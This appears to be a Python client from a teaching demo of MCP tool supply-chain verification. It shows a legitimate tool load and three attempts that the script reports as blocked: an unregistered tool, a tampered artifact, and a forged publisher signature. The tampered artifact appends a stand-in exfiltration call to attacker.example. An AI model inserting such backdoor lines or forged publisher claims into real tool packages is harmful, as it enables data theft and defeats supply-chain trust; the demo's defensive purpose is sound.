"""
MCP04 — Client (Agent side)
------------------------------
Shows an agent loading the legitimate, manifest-verified compliance_checker
tool against the running server, then attempting the two attacks from
attack_demo.py against the live server: loading an unregistered
"compliance_checker_v2" tool, and publishing a forged manifest entry that
claims to come from a trusted publisher.
"""

import asyncio
import httpx

from supply_chain import COMPLIANCE_CHECKER_ARTIFACT, ROGUE_VENDOR, sha256_hex

MCP_SERVER_URL = "http://localhost:8004"


async def load_and_call(client: httpx.AsyncClient, tool_name: str, artifact: bytes, params: dict) -> None:
    print(f"AGENT: loading '{tool_name}'")
    response = await client.post(
        f"{MCP_SERVER_URL}/tools/call",
        json={"tool_name": tool_name, "artifact": artifact.decode("utf-8"), "params": params},
    )
    print(f"MCP Server -> {response.status_code}: {response.json()}\n")


async def publish(client: httpx.AsyncClient, tool_name: str, publisher_id: str, artifact: bytes, signature_hex: str) -> None:
    print(f"AGENT: publishing '{tool_name}' claiming publisher '{publisher_id}'")
    response = await client.post(
        f"{MCP_SERVER_URL}/manifest/publish",
        json={
            "tool_name": tool_name,
            "publisher_id": publisher_id,
            "artifact": artifact.decode("utf-8"),
            "signature_hex": signature_hex,
        },
    )
    print(f"MCP Server -> {response.status_code}: {response.json()}\n")


async def main():
    print("\nMCP04 — Supply Chain Verification Demo\n")

    async with httpx.AsyncClient() as client:
        manifest = await client.get(f"{MCP_SERVER_URL}/manifest")
        print(f"GET /manifest -> {manifest.json()}\n")

        print("--- Legitimate load (correct artifact, in the manifest) ---")
        await load_and_call(client, "compliance_checker", COMPLIANCE_CHECKER_ARTIFACT, {"device_id": "D-1042"})

        print("--- Attack: unregistered tool name, never audited ---")
        await load_and_call(client, "compliance_checker_v2", COMPLIANCE_CHECKER_ARTIFACT, {"device_id": "D-1042"})

        print("--- Attack: tampered artifact under the real tool name ---")
        backdoor_artifact = COMPLIANCE_CHECKER_ARTIFACT + b"\n# exfiltrate_to('http://attacker.example/collect')\n"
        await load_and_call(client, "compliance_checker", backdoor_artifact, {"device_id": "D-1042"})

        print("--- Attack: forged manifest entry claiming a trusted publisher ---")
        forged_hash = sha256_hex(backdoor_artifact)
        forged_signature = ROGUE_VENDOR.sign_hash(forged_hash)  # attacker doesn't hold acme-security's key
        await publish(client, "compliance_checker_v2", "acme-security", backdoor_artifact, forged_signature)

        audit_log = await client.get(f"{MCP_SERVER_URL}/audit-log")
        print(f"GET /audit-log -> {len(audit_log.json()['entries'])} entries recorded")

    print("=" * 60)
    print("Summary:")
    print("  compliance_checker (verified) loaded and executed — by design")
    print("  compliance_checker_v2 (unregistered) could NOT load — also by design")
    print("  a tampered artifact under a known tool name could NOT load — also by design")
    print("  a forged manifest entry claiming 'acme-security' could NOT be published — also by design")
    print("=" * 60 + "\n")


if __name__ == "__main__":
    asyncio.run(main())
